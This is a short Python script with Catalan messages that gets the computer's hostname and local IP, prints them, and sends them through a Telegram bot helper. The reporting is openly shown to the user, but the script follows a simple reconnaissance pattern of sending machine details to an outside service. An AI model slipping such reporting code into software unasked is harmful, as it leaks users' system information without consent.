import socket
from bot_telegram import enviarMensaje

hostname = socket.gethostname()

#Extracció de IP's
ip = socket.gethostbyname(hostname)
ip2 = socket.getaddrinfo("google.com", 80)
print ("    El nom del teu ordinador és: " + hostname)
print ("    La teva IP és: " + ip)
enviarMensaje("El nom del teu ordinador és: " + hostname + " i la teva IP és: " + ip)

